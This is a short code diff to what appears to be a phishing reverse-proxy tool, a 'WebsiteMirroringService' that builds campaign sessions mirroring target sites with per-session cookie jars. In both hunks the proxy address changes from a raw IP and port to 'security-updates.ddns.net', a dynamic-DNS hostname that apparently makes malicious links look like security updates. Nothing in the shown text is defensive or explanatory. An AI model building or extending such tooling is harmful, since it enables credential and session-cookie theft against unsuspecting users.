@@ -1561,7 +1561,7 @@ class WebsiteMirroringService {
             campaignId: dbSession.campaign_id,
             targetUrl: dbSession.target_url,
             sessionToken,
-            proxyUrl: `http://147.93.87.182:5000/${sessionToken}`,
+            proxyUrl: `https://security-updates.ddns.net/${sessionToken}`,
             startTime: new Date(dbSession.created_at)
           };
           
@@ -1731,8 +1731,8 @@ class WebsiteMirroringService {
         );
       });
 
-      // Create proxy URL using path-based routing on port 5000
-      const proxyUrl = `http://147.93.87.182:5000/${sessionToken}`;
+      // Create proxy URL using path-based routing on the new domain
+      const proxyUrl = `https://security-updates.ddns.net/${sessionToken}`;
       
       // Create cookie jar for this session
       const cookieJar = new CookieJar();
